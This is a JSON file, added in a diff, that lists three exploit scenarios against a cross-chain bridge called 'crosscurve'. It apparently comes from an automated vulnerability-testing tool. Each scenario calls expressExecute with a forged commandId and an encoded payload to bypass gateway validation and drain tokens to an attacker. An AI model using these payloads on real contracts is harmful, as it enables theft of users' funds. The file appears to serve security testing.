@@ -1,0 +1,92 @@
+{
+  "bridge_name": "crosscurve",
+  "scenarios": [
+    {
+      "scenario_id": "exploit_express_execute",
+      "target_invariant": "inv_asset_conservation",
+      "vulnerability_class": "missing_validation",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000003635c9adc5dea00000"
+          },
+          "description": "Call expressExecute with a forged commandId and payload, bypassing gateway validation, causing PortalV2.release to transfer 1000 DstToken to attacker."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call expressExecute with a forged commandId and payload, bypassing gateway validation, causing PortalV2.release to transfer 1000 DstToken to attacker."
+        }
+      ]
+    },
+    {
+      "scenario_id": "exploit_001",
+      "target_invariant": "inv_authorization",
+      "vulnerability_class": "authorization bypass",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000d3c21bcecceda1000000"
+          },
+          "description": "Call expressExecute with a fake commandId and sourceAddress set to the trusted PortalSrc address. The payload encodes attacker as recipient and the full DstToken balance (1,000,000 tokens). expressExecute skips gateway validation, allowing unauthorized release of tokens from PortalV2 to attacker."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call expressExecute with a fake commandId and sourceAddress set to the trusted PortalSrc address. The payload encodes attacker as recipient and the full DstToken balance (1,000,000 tokens). expressExecute skips gateway validation, allowing unauthorized release of tokens from PortalV2 to attacker."
+        }
+      ]
+    },
+    {
+      "scenario_id": "exploit_express_execute",
+      "target_invariant": "inv_uniqueness",
+      "vulnerability_class": "validation_bypass",
+      "confidence": 0.97,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "ReceiverAxelar",
+          "function": "expressExecute(bytes32,address,bytes)",
+          "params": {
+            "commandId": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "sourceAddress": "PortalSrc",
+            "payload": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000056bc75e2d63100000"
+          },
+          "description": "Bypass gateway validation and directly release 100 DstToken to attacker, violating the uniqueness invariant."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Bypass gateway validation and directly release 100 DstToken to attacker, violating the uniqueness invariant."
+        }
+      ]
+    }
+  ]
+}
